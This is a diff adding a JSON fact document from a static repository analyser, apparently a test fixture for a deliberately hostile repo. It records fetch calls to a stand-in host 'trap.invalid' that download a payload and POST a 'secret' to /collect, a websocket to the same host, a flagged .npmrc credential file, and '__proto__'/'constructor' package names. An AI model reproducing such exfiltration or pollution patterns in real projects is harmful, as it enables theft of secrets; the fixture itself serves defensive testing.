+      "id": "ev_d0f2f7bfaf9505ffdd8ebe4f",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "5f8da3a3a9c8e3fdd76cd1e27b1bbe90a0242d0b",
+      "path": ".github/workflows/ci.yml",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_d5565a974389e4a60f1060bc": {
+      "commit": null,
+      "content_digest": "3865762b0c8b83efc1c842c8eb72412b67ad153748b06120f1284b5ab3e3d1c4",
+      "detector": "service-dependencies",
+      "excerpt_digest": "532dd9bc5bf3214925b7b1af0800d6c6a86f4d7c5800fba8e0386cb013e4bfc1",
+      "id": "ev_d5565a974389e4a60f1060bc",
+      "location": {
+        "end": 5,
+        "kind": "lines",
+        "start": 5
+      },
+      "object_id": "8802a0053322f9aa85f12ae94b8a15fe6f29fa4c",
+      "path": "vite.config.ts",
+      "rule": "services.fetch"
+    },
+    "ev_d5a0ea38550d0bc6b83f8742": {
+      "commit": null,
+      "content_digest": "16d1ea64a9eac3953155b1cc14ae35905fb19f49856c0e0c60a7acd00eba074f",
+      "detector": "inventory",
+      "excerpt_digest": "16d1ea64a9eac3953155b1cc14ae35905fb19f49856c0e0c60a7acd00eba074f",
+      "id": "ev_d5a0ea38550d0bc6b83f8742",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "inventory.language-by-extension"
+    },
+    "ev_d654d631dfd7702578f163ae": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-relations",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_d654d631dfd7702578f163ae",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/version"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "packages.produced"
+    },
+    "ev_d662ea1cf09a2036e7ddba2f": {
+      "commit": null,
+      "content_digest": "3968131f746e4f6209a6151865ebe7be8ac22825e23eb0faa112d3ac0f1e3565",
+      "detector": "tooling",
+      "excerpt_digest": "3968131f746e4f6209a6151865ebe7be8ac22825e23eb0faa112d3ac0f1e3565",
+      "id": "ev_d662ea1cf09a2036e7ddba2f",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "2c4daa84fe63f76ae21134bc2c57cb3f38169f1a",
+      "path": "webpack.config.js",
+      "rule": "config.tool-file"
+    },
+    "ev_d8c197b1cefde04ca19144e7": {
+      "commit": null,
+      "content_digest": "2f4d4e68c356e9d546a577ea00ec2eaeb96f6692ad3773870eea7831d0f83947",
+      "detector": "npm-lock",
+      "excerpt_digest": "39fe4a40977d0585fd5704359e3685b0ada5cf5ee061e5d97385601d120cd0ec",
+      "id": "ev_d8c197b1cefde04ca19144e7",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/packages/node_modules~1constructor/version"
+      },
+      "object_id": "a82c6f4cafdf040574ea4aaea5b9061b74ca2f6c",
+      "path": "package-lock.json",
+      "rule": "npm-lock.resolved-version"
+    },
+    "ev_dd6f2d677a62f6b7e4cba6f2": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "tooling",
+      "excerpt_digest": "924687e02818c67b11bc84a752290a5db8c36ad4aaf4f193eb0d6a6b1cb087fe",
+      "id": "ev_dd6f2d677a62f6b7e4cba6f2",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/devDependencies/vite"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.tool-dependency"
+    },
+    "ev_e9e7fcee8fb78f49623a3727": {
+      "commit": null,
+      "content_digest": "34e6c17ed4805c0846b81e81e84f1e55b483beb3d1598856102433a410dfbae0",
+      "detector": "package-metadata",
+      "excerpt_digest": "e67688b317883bb6eb9157728fbdff0ea3daf8ada2378feb785f2c825a00da94",
+      "id": "ev_e9e7fcee8fb78f49623a3727",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/name"
+      },
+      "object_id": "1ec517ff2f7733f165b0f9b76a7222d108f6370c",
+      "path": "package.json",
+      "rule": "manifest.identity"
+    },
+    "ev_eddd52e959f798e54b7623d4": {
+      "commit": null,
+      "content_digest": "f109013b0f83e23db4ec3a1f6bb07bb4908669e843adeb04b0738ca6c7a6486b",
+      "detector": "package-metadata",
+      "excerpt_digest": "88994f64c9983156f7768b1c59d8b36c2dc762c977caafe208b0cf255feeefb7",
+      "id": "ev_eddd52e959f798e54b7623d4",
+      "location": {
+        "format": "json",
+        "kind": "pointer",
+        "pointer": "/name"
+      },
+      "object_id": "2d5c76a68983f5d34bead14e6e1df8e5752873c5",
+      "path": "packages/plugin/package.json",
+      "rule": "manifest.identity"
+    },
+    "ev_fff26b833f737eaa9015ea4f": {
+      "commit": null,
+      "content_digest": "6459eb53f7e62dd05f53245dc433bfcf924e49d277d6f5f4f6638172e1841d02",
+      "detector": "service-signals",
+      "excerpt_digest": "6459eb53f7e62dd05f53245dc433bfcf924e49d277d6f5f4f6638172e1841d02",
+      "id": "ev_fff26b833f737eaa9015ea4f",
+      "location": {
+        "kind": "entry"
+      },
+      "object_id": "1af25e93ca72ab2e838694e36135044f00590186",
+      "path": ".npmrc",
+      "rule": "access.credential-file"
+    }
+  },
+  "extensions": [],
+  "inventory": {
+    "bytes": 22185,
+    "bytes_read": 21889,
+    "entries": 36,
+    "executables": 1,
+    "files": 26,
+    "files_read": 22,
+    "gitlinks": 1,
+    "symlinks": 1
+  },
+  "relationship_references": [
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_87f34706bdaa99202001c574"
+      ],
+      "id": "ref_06a0c05cd2ddb90472cf4b52",
+      "identifier": {
+        "name": "hostile-plugin"
+      },
+      "role": "producer",
+      "rule": "packages.produced",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_20447843626860d971d6b488"
+      ],
+      "id": "ref_27e7029512b13832a8e20a6c",
+      "identifier": {
+        "name": "trap-git"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_36664c514ec2654c8e949df5",
+        "ev_711090ee3ffc82bacdbe5414",
+        "ev_d5565a974389e4a60f1060bc"
+      ],
+      "id": "ref_2f40f4441c8b3e5c75139799",
+      "identifier": {
+        "key": "http://trap.invalid"
+      },
+      "role": "caller",
+      "rule": "services.fetch",
+      "type": "service"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_92010aa9e9fb7e11e1f55225"
+      ],
+      "id": "ref_2f641dcbddfcece7e58f5061",
+      "identifier": {
+        "mechanism": "module-federation",
+        "name": "trap"
+      },
+      "role": "host",
+      "rule": "architecture.module-federation",
+      "type": "composition"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_b91fa66f5f6fd86c50d370b4"
+      ],
+      "id": "ref_3648e15375e8a7845f7bf5d9",
+      "identifier": {
+        "mechanism": "import-map",
+        "specifier": "app"
+      },
+      "role": "host",
+      "rule": "architecture.import-map",
+      "type": "composition"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_18622435fc114c7cf2b30715"
+      ],
+      "id": "ref_438bfb1b8bb6b70151d8f3e5",
+      "identifier": {
+        "name": "webpack"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_8b943fddaf8d6736a3d3889f"
+      ],
+      "id": "ref_459cb664e4a5b86cff7e8f91",
+      "identifier": {
+        "key": "websocket:ws://trap.invalid"
+      },
+      "role": "caller",
+      "rule": "services.websocket",
+      "type": "service"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_708741572754875d64ccf54b"
+      ],
+      "id": "ref_4b036e2faf1a77d736fb2b22",
+      "identifier": {
+        "name": "trap-tarball"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_411b0a34b16a0aed3d925e52"
+      ],
+      "id": "ref_55bd69cf3b6dac0debfdd279",
+      "identifier": {
+        "name": "vite"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_b5a4bd40150a7294cf4546f2"
+      ],
+      "id": "ref_6dc56b42a373296bab485906",
+      "identifier": {
+        "name": "__proto__"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_af93b6f81b22b1f303b607b8"
+      ],
+      "id": "ref_7432ffb75237b29ede51a548",
+      "identifier": {
+        "key": "sse:http://127.0.0.1:9"
+      },
+      "role": "caller",
+      "rule": "services.event-source",
+      "type": "service"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_12ece8d4b4918ff6f3338591"
+      ],
+      "id": "ref_c21d739482e2e77c167929a1",
+      "identifier": {
+        "key": "https://api.example.test"
+      },
+      "role": "caller",
+      "rule": "services.fetch",
+      "type": "service"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_b91fa66f5f6fd86c50d370b4"
+      ],
+      "id": "ref_e254bfc927255cbc6345c0bc",
+      "identifier": {
+        "mechanism": "import-map",
+        "specifier": "__proto__"
+      },
+      "role": "host",
+      "rule": "architecture.import-map",
+      "type": "composition"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_593dc0a6479bb283f95451be"
+      ],
+      "id": "ref_ee1bb48d6da54d17c52abf82",
+      "identifier": {
+        "name": "constructor"
+      },
+      "role": "consumer",
+      "rule": "packages.consumed",
+      "type": "package"
+    },
+    {
+      "basis": "observed",
+      "evidence": [
+        "ev_2293a793ed373b201fbf4fe6"
+      ],
+      "id": "ref_f53f1cd2acb1d8131b2b7cc0",
+      "identifier": {
+        "name": "hostile-repository"
+      },
+      "role": "producer",
+      "rule": "packages.produced",
+      "type": "package"
+    }
+  ],
+  "schema": "repo_facts.fact_document",
+  "schema_version": 1,
+  "service_dependencies": [
+    {
+      "access": {
+        "reason": "Static discovery cannot establish entitlement, credentials, or reachability; no connectivity check is performed.",
+        "state": "unknown"
+      },
+      "authentication": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "unknown",
+        "value": {
+          "reason": "No authentication is stated at the call site"
+        }
+      },
+      "call_sites": [
+        "ev_36664c514ec2654c8e949df5",
+        "ev_711090ee3ffc82bacdbe5414",
+        "ev_d5565a974389e4a60f1060bc"
+      ],
+      "characterizable": false,
+      "client": {
+        "kind": "fetch",
+        "package": null
+      },
+      "consumed_response_fields": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "unknown",
+        "value": {
+          "known": []
+        }
+      },
+      "contracts": {
+        "evidence": [
+          "ev_1b5e64df587e332f23471647"
+        ],
+        "rule": "services.evidence-association",
+        "state": "observed",
+        "value": [
+          {
+            "association": "server_origin",
+            "kind": "openapi",
+            "path": "openapi.yaml"
+          }
+        ]
+      },
+      "endpoint": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": {
+          "derivation": "literal",
+          "origin": "http://trap.invalid"
+        }
+      },
+      "id": "svc_1e13e074891beb2ff6866c65",
+      "identity": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": {
+          "kind": "origin",
+          "value": "http://trap.invalid"
+        }
+      },
+      "key": "http://trap.invalid",
+      "missing_evidence": [
+        "consumed_response_fields",
+        "authentication",
+        "retry",
+        "proxy",
+        "substitutes"
+      ],
+      "operations": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": [
+          {
+            "method": "GET",
+            "method_source": "default",
+            "path": "/payload"
+          },
+          {
+            "method": "GET",
+            "method_source": "default",
+            "path": "/vite-config"
+          },
+          {
+            "method": "POST",
+            "path": "/collect"
+          }
+        ]
+      },
+      "protocol": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": "http"
+      },
+      "proxy": {
+        "evidence": [],
+        "rule": "not-established",
+        "state": "unknown",
+        "value": null
+      },
+      "request_shape": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": [
+          {
+            "fields": [
+              "secret"
+            ],
+            "operation": {
+              "method": "POST",
+              "path": "/collect"
+            }
+          }
+        ]
+      },
+      "retry": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "state": "unknown",
+        "value": {
+          "reason": "Retries could be added outside the call site"
+        }
+      },
+      "substitutes": {
+        "evidence": [],
+        "rule": "substitutes.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "timeout": {
+        "evidence": [
+          "ev_36664c514ec2654c8e949df5",
+          "ev_711090ee3ffc82bacdbe5414",
+          "ev_d5565a974389e4a60f1060bc"
+        ],
+        "rule": "services.fetch",
+        "search": {
+          "complete": true,
+          "rules": [
+            "services.fetch"
+          ],
+          "skipped": [],
+          "surface": [
+            "src/api.ts",
+            "src/payload.js",
+            "vite.config.ts"
+          ]
+        },
+        "state": "absent",
+        "value": null
+      }
+    },
+    {
+      "access": {
+        "reason": "Static discovery cannot establish entitlement, credentials, or reachability; no connectivity check is performed.",
+        "state": "unknown"
+      },
+      "authentication": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": [
+          {
+            "header": "Authorization",
+            "value_source": {
+              "kind": "literal"
+            }
+          }
+        ]
+      },
+      "call_sites": [
+        "ev_12ece8d4b4918ff6f3338591"
+      ],
+      "characterizable": false,
+      "client": {
+        "kind": "fetch",
+        "package": null
+      },
+      "consumed_response_fields": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "unknown",
+        "value": {
+          "known": []
+        }
+      },
+      "contracts": {
+        "evidence": [],
+        "rule": "contracts.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "endpoint": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": {
+          "derivation": "literal",
+          "origin": "https://api.example.test"
+        }
+      },
+      "id": "svc_68c1217adc6dd35677b0348c",
+      "identity": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": {
+          "kind": "origin",
+          "value": "https://api.example.test"
+        }
+      },
+      "key": "https://api.example.test",
+      "missing_evidence": [
+        "consumed_response_fields",
+        "retry",
+        "proxy",
+        "contracts",
+        "substitutes"
+      ],
+      "operations": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": [
+          {
+            "method": "GET",
+            "method_source": "default",
+            "path": "/x"
+          }
+        ]
+      },
+      "protocol": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "observed",
+        "value": "http"
+      },
+      "proxy": {
+        "evidence": [],
+        "rule": "not-established",
+        "state": "unknown",
+        "value": null
+      },
+      "request_shape": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "search": {
+          "complete": true,
+          "rules": [
+            "services.fetch"
+          ],
+          "skipped": [],
+          "surface": [
+            "src/api.ts"
+          ]
+        },
+        "state": "absent",
+        "value": null
+      },
+      "retry": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "state": "unknown",
+        "value": {
+          "reason": "Retries could be added outside the call site"
+        }
+      },
+      "substitutes": {
+        "evidence": [],
+        "rule": "substitutes.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "timeout": {
+        "evidence": [
+          "ev_12ece8d4b4918ff6f3338591"
+        ],
+        "rule": "services.fetch",
+        "search": {
+          "complete": true,
+          "rules": [
+            "services.fetch"
+          ],
+          "skipped": [],
+          "surface": [
+            "src/api.ts"
+          ]
+        },
+        "state": "absent",
+        "value": null
+      }
+    },
+    {
+      "access": {
+        "reason": "Static discovery cannot establish entitlement, credentials, or reachability; no connectivity check is performed.",
+        "state": "unknown"
+      },
+      "authentication": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "unknown",
+        "value": {
+          "reason": "No authentication is stated at the call site"
+        }
+      },
+      "call_sites": [
+        "ev_af93b6f81b22b1f303b607b8"
+      ],
+      "characterizable": false,
+      "client": {
+        "kind": "event_source",
+        "package": null
+      },
+      "consumed_response_fields": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "unknown",
+        "value": {
+          "known": []
+        }
+      },
+      "contracts": {
+        "evidence": [],
+        "rule": "contracts.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "endpoint": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "observed",
+        "value": {
+          "derivation": "literal",
+          "origin": "http://127.0.0.1:9"
+        }
+      },
+      "id": "svc_1cbaec3a467a8198bf5c00e9",
+      "identity": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "observed",
+        "value": {
+          "kind": "origin",
+          "value": "http://127.0.0.1:9"
+        }
+      },
+      "key": "sse:http://127.0.0.1:9",
+      "missing_evidence": [
+        "request_shape",
+        "consumed_response_fields",
+        "authentication",
+        "timeout",
+        "retry",
+        "proxy",
+        "contracts",
+        "substitutes"
+      ],
+      "operations": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "observed",
+        "value": [
+          {
+            "kind": "stream",
+            "path": "/events"
+          }
+        ]
+      },
+      "protocol": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "observed",
+        "value": "sse"
+      },
+      "proxy": {
+        "evidence": [],
+        "rule": "not-established",
+        "state": "unknown",
+        "value": null
+      },
+      "request_shape": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "unknown",
+        "value": null
+      },
+      "retry": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "unknown",
+        "value": {
+          "reason": "Retries could be added outside the call site"
+        }
+      },
+      "substitutes": {
+        "evidence": [],
+        "rule": "substitutes.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "timeout": {
+        "evidence": [
+          "ev_af93b6f81b22b1f303b607b8"
+        ],
+        "rule": "services.event-source",
+        "state": "unknown",
+        "value": {
+          "reason": "This client's timeout is not stated at the call site"
+        }
+      }
+    },
+    {
+      "access": {
+        "reason": "Static discovery cannot establish entitlement, credentials, or reachability; no connectivity check is performed.",
+        "state": "unknown"
+      },
+      "authentication": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "unknown",
+        "value": {
+          "reason": "No authentication is stated at the call site"
+        }
+      },
+      "call_sites": [
+        "ev_8b943fddaf8d6736a3d3889f"
+      ],
+      "characterizable": false,
+      "client": {
+        "kind": "websocket",
+        "package": null
+      },
+      "consumed_response_fields": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "unknown",
+        "value": {
+          "known": []
+        }
+      },
+      "contracts": {
+        "evidence": [],
+        "rule": "contracts.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "endpoint": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "observed",
+        "value": {
+          "derivation": "literal",
+          "origin": "ws://trap.invalid"
+        }
+      },
+      "id": "svc_0e737340e0c386c44a8129c1",
+      "identity": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "observed",
+        "value": {
+          "kind": "origin",
+          "value": "ws://trap.invalid"
+        }
+      },
+      "key": "websocket:ws://trap.invalid",
+      "missing_evidence": [
+        "request_shape",
+        "consumed_response_fields",
+        "authentication",
+        "timeout",
+        "retry",
+        "proxy",
+        "contracts",
+        "substitutes"
+      ],
+      "operations": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "observed",
+        "value": [
+          {
+            "kind": "connect",
+            "path": "/socket"
+          }
+        ]
+      },
+      "protocol": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "observed",
+        "value": "websocket"
+      },
+      "proxy": {
+        "evidence": [],
+        "rule": "not-established",
+        "state": "unknown",
+        "value": null
+      },
+      "request_shape": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "unknown",
+        "value": null
+      },
+      "retry": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "unknown",
+        "value": {
+          "reason": "Retries could be added outside the call site"
+        }
+      },
+      "substitutes": {
+        "evidence": [],
+        "rule": "substitutes.search",
+        "state": "unknown",
+        "value": {
+          "reason": "Some inputs could not be searched"
+        }
+      },
+      "timeout": {
+        "evidence": [
+          "ev_8b943fddaf8d6736a3d3889f"
+        ],
+        "rule": "services.websocket",
+        "state": "unknown",
+        "value": {
+          "reason": "This client's timeout is not stated at the call site"
+        }
+      }
+    }
+  ]
+}
